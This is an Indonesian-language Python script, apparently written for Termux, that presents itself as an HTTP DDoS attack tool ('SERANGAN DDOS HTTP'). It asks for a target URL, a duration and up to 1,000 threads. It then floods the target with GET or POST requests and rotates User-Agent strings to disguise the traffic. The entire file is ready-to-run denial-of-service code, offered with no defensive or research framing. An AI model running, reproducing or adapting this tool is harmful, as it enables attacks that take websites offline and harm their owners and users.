#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import threading
import time
import os
import sys
import random
from datetime import datetime
from urllib.parse import urlparse

# Warna untuk terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

os.system('clear')

# Banner baru untuk Abid
print(Colors.PURPLE + Colors.BOLD + r"""
╔══════════════════════════════════════════════════════════╗
║     █████╗ ██████╗ ██╗██████╗                          ║
║    ██╔══██╗██╔══██╗██║██╔══██╗                         ║
║    ███████║██████╔╝██║██║  ██║                         ║
║    ██╔══██║██╔══██╗██║██║  ██║                         ║
║    ██║  ██║██████╔╝██║██████╔╝                         ║
║    ╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝                          ║
║                                                          ║
║          🔥 SERANGAN DDOS HTTP 🔥                      ║
║                   OLEH: ABID                            ║
║                   VERSI: 3.0                            ║
╚══════════════════════════════════════════════════════════╝
""" + Colors.RESET)

print(Colors.CYAN + "⚡" + "="*60 + "⚡" + Colors.RESET)
print(Colors.YELLOW + "📅 Tanggal: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + Colors.RESET)
print(Colors.GREEN + "📱 Perangkat: Termux" + Colors.RESET)
print(Colors.CYAN + "⚡" + "="*60 + "⚡\n" + Colors.RESET)

# User Agents untuk menyamarkan
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

def validate_url(url):
    """Memvalidasi URL"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        return parsed.netloc != ''
    except:
        return False

def get_ip_from_url(url):
    """Mendapatkan IP dari URL"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        import socket
        ip = socket.gethostbyname(parsed.netloc)
        return ip
    except:
        return "Tidak diketahui"

packets_sent = 0
packets_lock = threading.Lock()

def ddos_worker(target_url, duration, thread_id, method="GET"):
    """Pekerja serangan"""
    global packets_sent
    start_time = time.time()
    local_packets = 0
    session = requests.Session()
    
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': '*/*',
        'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    
    while time.time() - start_time < duration:
        try:
            if method == "GET":
                response = session.get(target_url, headers=headers, timeout=3)
            else:
                response = session.post(target_url, headers=headers, timeout=3, data={'test': 'data'})
            
            with packets_lock:
                packets_sent += 1
                local_packets += 1
            
            if local_packets % 10 == 0:
                print(Colors.GREEN + f"[Thread-{thread_id}] 📦 Dikirim {local_packets} permintaan - Status: {response.status_code}" + Colors.RESET)
                
        except requests.exceptions.Timeout:
            print(Colors.YELLOW + f"[Thread-{thread_id}] ⏱️ Waktu habis" + Colors.RESET)
        except requests.exceptions.ConnectionError:
            print(Colors.RED + f"[Thread-{thread_id}] 🔌 Kesalahan koneksi" + Colors.RESET)
        except Exception as e:
            print(Colors.RED + f"[Thread-{thread_id}] ❌ Error: {str(e)[:50]}" + Colors.RESET)
    
    session.close()
    print(Colors.BLUE + f"[Thread-{thread_id}] ✅ Selesai - Mengirim {local_packets} permintaan" + Colors.RESET)

def main():
    print(Colors.BOLD + Colors.CYAN + "\n⚙️  KONFIGURASI" + Colors.RESET)
    print(Colors.CYAN + "─"*50 + Colors.RESET)
    
    while True:
        target_url = input(Colors.GREEN + "🌐 Masukkan URL target: " + Colors.RESET).strip()
        if validate_url(target_url):
            break
        else:
            print(Colors.RED + "❌ URL tidak valid! Masukkan URL yang benar (contoh: example.com)" + Colors.RESET)
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
        print(Colors.YELLOW + f"📌 Menggunakan: {target_url}" + Colors.RESET)
    
    target_ip = get_ip_from_url(target_url)
    print(Colors.CYAN + f"📌 IP teratasi: {target_ip}" + Colors.RESET)
    
    while True:
        try:
            duration_input = input(Colors.GREEN + "⏱️ Durasi serangan (detik) [default: 60]: " + Colors.RESET).strip()
            if duration_input == "":
                duration = 60
                break
            duration = int(duration_input)
            if duration > 0:
                break
            else:
                print(Colors.RED + "❌ Durasi harus positif!" + Colors.RESET)
        except ValueError:
            print(Colors.RED + "❌ Masukkan angka yang valid!" + Colors.RESET)
    
    while True:
        try:
            threads_input = input(Colors.GREEN + "🧵 Jumlah thread [default: 50]: " + Colors.RESET).strip()
            if threads_input == "":
                num_threads = 50
                break
            num_threads = int(threads_input)
            if 1 <= num_threads <= 1000:
                break
            else:
                print(Colors.RED + "❌ Thread harus antara 1 dan 1000!" + Colors.RESET)
        except ValueError:
            print(Colors.RED + "❌ Masukkan angka yang valid!" + Colors.RESET)
    
    print(Colors.YELLOW + "\n📋 Metode HTTP:" + Colors.RESET)
    print("1. GET (lebih cepat)")
    print("2. POST (lebih kuat)")
    
    method_choice = input(Colors.GREEN + "👉 Pilihan [default: 1]: " + Colors.RESET).strip()
    method = "POST" if method_choice == "2" else "GET"
    
    estimated_packets = duration * num_threads * 5
    print(Colors.CYAN + "\n" + "─"*50 + Colors.RESET)
    print(Colors.BOLD + Colors.YELLOW + "📊 Ringkasan Serangan:" + Colors.RESET)
    print(f"   URL: {target_url}")
    print(f"   IP: {target_ip}")
    print(f"   Durasi: {duration} detik")
    print(f"   Thread: {num_threads}")
    print(f"   Metode: {method}")
    print(f"   Perkiraan paket: ~{estimated_packets}")
    print(Colors.CYAN + "─"*50 + Colors.RESET)
    
    confirm = input(Colors.YELLOW + "⚠️  Mulai serangan? (y/n): " + Colors.RESET).lower().strip()
    if confirm != 'y':
        print(Colors.RED + "❌ Serangan dibatalkan!" + Colors.RESET)
        return
    
    print(Colors.RED + Colors.BOLD + f"\n🔥 SERANGAN DIMULAI ke {target_url}" + Colors.RESET)
    print(Colors.YELLOW + f"⏱️ Durasi: {duration}s | 🧵 Thread: {num_threads} | 📋 Metode: {method}\n" + Colors.RESET)
    
    threads = []
    start_time = time.time()
    global packets_sent
    packets_sent = 0
    
    try:
        for i in range(num_threads):
            thread = threading.Thread(target=ddos_worker, args=(target_url, duration, i+1, method))
            threads.append(thread)
            thread.start()
            print(Colors.BLUE + f"✓ Thread {i+1} dimulai" + Colors.RESET)
            time.sleep(0.05)
        
        for thread in threads:
            thread.join()
        
        elapsed_time = time.time() - start_time
        print(Colors.GREEN + Colors.BOLD + f"\n✅ SERANGAN SELESAI!" + Colors.RESET)
        print(Colors.GREEN + f"📊 Total paket terkirim: {packets_sent}" + Colors.RESET)
        print(Colors.GREEN + f"⏱️ Waktu aktual: {elapsed_time:.2f} detik" + Colors.RESET)
        print(Colors.GREEN + f"📈 Rata-rata: {packets_sent/elapsed_time:.2f} paket/detik" + Colors.RESET)
        
    except KeyboardInterrupt:
        elapsed_time = time.time() - start_time
        print(Colors.YELLOW + Colors.BOLD + f"\n\n⚠️ SERANGAN DIHENTIKAN OLEH PENGGUNA!" + Colors.RESET)
        print(Colors.YELLOW + f"📊 Paket terkirim: {packets_sent}" + Colors.RESET)
        print(Colors.YELLOW + f"⏱️ Waktu berjalan: {elapsed_time:.2f} detik" + Colors.RESET)
    except Exception as e:
        print(Colors.RED + f"\n❌ Error: {e}" + Colors.RESET)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colors.YELLOW + "\n\n👋 Sampai jumpa!" + Colors.RESET)
    except Exception as e:
        print(Colors.RED + f"\n❌ Error fatal: {e}" + Colors.RESET)
    
    print(Colors.PURPLE + "\n" + "⚡"*50 + Colors.RESET)
    print(Colors.CYAN + "✨ Dibuat oleh ABID" + Colors.RESET)
    print(Colors.PURPLE + "⚡"*50 + Colors.RESET)